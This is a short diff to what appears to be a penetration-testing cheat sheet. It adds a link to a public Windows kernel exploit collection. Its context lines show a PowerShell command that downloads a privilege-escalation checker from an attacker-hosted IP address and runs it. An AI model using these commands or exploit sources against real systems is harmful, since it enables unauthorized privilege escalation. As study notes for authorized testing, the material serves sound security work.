@@ -750,6 +750,11 @@ iwr -uri http://192.168.45.159:1337/privesccheck.ps1 -Outfile privesccheck.ps1
 Invoke-PrivescCheck -Extended -Report "privesccheck_$($env:COMPUTERNAME)"
    #+end_example
 
+Windows kernel exploit library
+  #+begin_example
+https://github.com/SecWiki/windows-kernel-exploits
+  #+end_example
+
 ** Windows AD
 
    List all currently joined machine in the AD
